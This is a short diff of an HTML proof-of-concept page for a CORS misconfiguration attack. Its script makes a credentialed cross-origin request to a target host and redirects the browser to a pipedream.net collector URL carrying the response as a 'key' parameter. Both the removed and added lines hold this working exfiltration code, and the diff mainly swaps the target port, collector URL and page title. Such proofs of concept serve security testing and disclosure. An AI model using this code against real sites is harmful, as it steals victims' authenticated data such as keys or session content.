@@ -5,18 +5,18 @@
   <script>
     var req = new XMLHttpRequest();
     req.onload = reqListener;
-    req.open('get', 'http://vuln.hacker.com', true);
+    req.open('get', 'http://vuln.hacker.com:2021/', true);
     req.withCredentials = true;
     req.send();
 
     function reqListener() {
-      location = 'https://enm4mec04z86.x.pipedream.net/?key=' + this.responseText;
+      location = 'https://en4z5ix0i5x3k.x.pipedream.net?key=' + this.responseText;
     };
   </script>
 </head>
 
 <body>
-  <h2>CORS PoC Exploit </h2>
+  <h2>CORS attack!!</h2>
   </div>
 </body>
 
